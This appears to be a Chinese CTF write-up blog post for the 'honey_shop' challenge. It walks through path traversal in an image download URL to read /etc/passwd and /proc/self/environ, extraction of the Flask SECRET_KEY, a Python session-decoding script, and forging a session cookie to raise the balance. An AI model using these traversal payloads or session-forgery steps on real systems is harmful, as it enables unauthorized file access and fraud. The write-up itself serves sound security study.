---
title: '[PASECA2019]honey_shop'
date: 2024-09-20 19:45:33
tags: session伪造
categories: 刷题笔记
---

## [PASECA2019]honey_shop

我们发现flag要1337块才能买，但我们只有1336块

我们点击图片，发现图片能够下载，那我们进行抓包看看



![image-20240920194735999](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409201947772.png)

这种url大多可以进行任意文件读取

<!--more-->

![image-20240920194846691](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409201948725.png)

我们尝试能不能读取到../../../etc/passwd

![image-20240920194925920](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409201949132.png)

也是成功读取到了文件内容，那我们试试flag能不能直接读取到

![image-20240920195003654](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409201950788.png)

显然，我们不能直接读取到flag

我们看看有没有其它的线索，我们点击buy进行抓包

![image-20240920195109319](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409201951415.png)

这个是购买物品的包，传入的item参数是物品序号，也没啥有用的信息。

没啥信息了，但我们看这特意提到的session，我们想到是不是可以继续session伪造来买东西

但我们需要找到这个网站的框架

我们访问../../../proc/self/envirson，发现这个网站是python的flask框架，那么这个网站的session可以破解

![image-20240920195322870](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409201953038.png)

我们使用脚本解密session

```
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode


def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                        'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                            'decoding the payload')

    return session_json_serializer.loads(payload)


if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))

```

![image-20240920195953700](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409201959786.png)

解出第一个是金钱

我们伪造session，需要**SECRET_KEY**的值

前面已经找到了

![image-20240920200057317](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409202000381.png)

我们伪造session

![image-20240920200416037](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409202004060.png)

我们购买时修改session，得到flag

![image-20240920200453075](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409202004230.png)
